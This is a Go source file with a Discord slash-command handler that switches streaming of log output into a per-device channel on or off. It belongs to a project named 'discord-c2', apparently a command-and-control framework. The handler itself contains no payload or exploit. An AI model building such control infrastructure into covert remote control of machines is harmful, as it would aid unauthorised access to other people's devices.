package commands

// This file contains the /log slash command handler, which toggles streaming
// of Go log output into the current device channel.

import (
	"strings"

	"discord-c2/internal/logstream"

	"github.com/bwmarrin/discordgo"
)

// handleSlashLog enables or disables log streaming for the current channel
// based on the supplied on/off mode argument.
func handleSlashLog(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var mode string
	for _, opt := range data.Options {
		if opt.Name == "mode" {
			mode = strings.ToLower(opt.StringValue())
			break
		}
	}
	if mode != "on" && mode != "off" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Mode must be `on` or `off`.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if mode == "on" {
		logstream.Enable(s, i.ChannelID)
	} else {
		logstream.Disable()
	}
	resp := "Log streaming disabled for this channel."
	if mode == "on" {
		resp = "Log streaming enabled for this channel."
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: resp,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}
